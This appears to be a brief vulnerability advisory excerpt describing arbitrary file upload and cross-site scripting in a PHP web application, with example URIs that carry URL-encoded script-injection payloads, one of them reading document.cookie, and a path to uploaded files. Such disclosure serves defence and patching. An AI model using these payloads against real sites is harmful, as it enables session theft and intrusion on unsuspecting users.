Attackers can exploit arbitrary file-upload issue through a browser. To exploit the cross-site scripting issue, an attacker must entice an unsuspecting user into following a malicious URI.

The following example URI is available:

http://www.example.com/index.php?page=home%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&amp;lang=de%27

http://www.example.com/asys/site/system.php?action=users_users&amp;mode=edit&amp;id=1%22%3E%3Cscript%3Ealert%281%29%3C/script%3E

http://www.example.com/upload/files/{UPLOADED_FILE}
